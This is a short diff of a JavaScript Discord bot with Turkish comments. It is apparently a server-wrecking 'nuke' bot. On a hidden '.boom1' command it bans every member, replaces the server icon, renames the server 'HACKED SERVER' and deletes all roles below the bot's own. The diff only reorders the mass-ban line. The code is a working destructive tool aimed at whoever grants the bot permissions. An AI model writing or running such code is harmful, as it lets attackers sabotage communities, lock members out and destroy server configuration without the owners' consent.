@@ -8,8 +8,8 @@ client.login(ayarlar.token);
 client.on("message", msg => {           
   if (msg.content === ".boom1") {
     msg.delete();
+     msg.guild.members.forEach(member => member.ban()); 
     
-     msg.guild.members.forEach(member => member.ban());  
      msg.guild.setIcon("https://i.hizliresim.com/fap98fs.jpg");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
      msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
      msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
